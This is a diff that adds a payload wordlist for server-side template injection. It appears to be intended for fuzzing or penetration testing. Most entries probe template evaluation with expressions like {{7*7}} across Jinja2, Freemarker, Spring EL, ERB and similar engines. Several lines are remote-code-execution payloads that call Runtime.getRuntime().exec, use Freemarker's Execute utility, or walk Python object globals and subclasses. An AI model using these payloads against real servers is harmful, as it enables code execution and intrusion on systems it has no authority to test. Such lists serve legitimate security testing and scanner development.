@@ -1,0 +1,35 @@
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+${{7*7}}
+{{config.__class__.__init__.__globals__}}
+{{self.__init__.__globals__}}
+{{"".__class__.__mro__[1].__subclasses__()}}
+{{request.application.__self__._get_data_for_json.__globals__["json"].loads("1")}}
+${applicationScope.serverContext}
+${T(org.apache.commons.lang.Runtime).getRuntime().exec("id")}
+${Runtime.getRuntime().exec("id")}
+#{T(java.lang.Runtime).getRuntime().exec("id")}
+${(7*7)}
+{{= 7*7}}
+{% 7*7 %}
+{{ 7*7 }}
+${7*"7"}
+@(7*7)
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"()("id")}
+${@java.lang.Runtime@getRuntime().exec("id")}
+*{7*7}
+$${7*7}
+[[${7*7}]]
+${"".getClass().forName("java.lang.Runtime")}
+%{7*7}
+${ 7*7}
+${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\A").next()}
+{%import "x" as y%}
+{{a}}
+${a}
+#{a}
+<%= a %>
+{{"" .__class__}}
